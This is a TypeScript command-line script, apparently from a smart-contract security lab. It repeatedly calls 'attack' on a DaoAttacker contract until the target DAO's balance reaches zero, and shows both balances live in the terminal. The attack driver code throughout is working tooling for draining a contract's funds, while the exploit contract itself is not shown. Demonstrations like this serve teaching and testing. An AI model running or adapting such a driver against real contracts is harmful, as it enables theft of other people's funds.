// deno --env-file --allow-all src/cli/dao-hack.tsx

// @ts-ignore
import React, { useState, useEffect } from 'react'
import { render, Text, Box } from 'ink'
import { formatEther } from 'viem'
import { Dao, DaoAttacker } from '../codegen/addresses.ts'
import { abis } from '../codegen/abis.ts'
import { env } from '../tools/lib/index.ts'

const { wallet } = env

// Fetch the current balances of the attacker and the DAO.
async function fetchBalances() {
    return Promise.all([
        wallet.getBalance({ address: DaoAttacker }),
        wallet.getBalance({ address: Dao }),
    ])
}

// call 'attack' on the DaoAttacker contract in a loop.
async function attack() {
    const { request } = await wallet.simulateContract({
        address: DaoAttacker,
        abi: abis.DaoAttacker,
        functionName: 'attack',
    })

    const hash = await wallet.writeContract(request)
    let receipt = await wallet.waitForTransactionReceipt({
        hash,
    })

    console.assert(receipt.status === 'success', 'Transaction failed')
}

// Get the initial balances.
const initialBalances = await fetchBalances()

// Render both balances in the terminal.
const App = () => {
    const [[attacker, dao], setBalances] = useState(initialBalances)

    // Run the attack in a loop
    useEffect(() => {
        let timeoutId: NodeJS.Timeout | undefined = undefined
        async function loop() {
            await attack()
            const [attacker, dao] = await fetchBalances()
            setBalances([attacker, dao])
            if (dao > 0) {
                timeoutId = setTimeout(loop, 100)
            }
        }
        loop()
        return () => clearTimeout(timeoutId)
    }, [])

    return (
        <Box flexDirection="column">
            <Text>🏴‍☠️ Attacker balance: {formatEther(attacker)}</Text>
            <Text>🏛️ DAO balance: {formatEther(dao)}</Text>
        </Box>
    )
}

render(<App />)
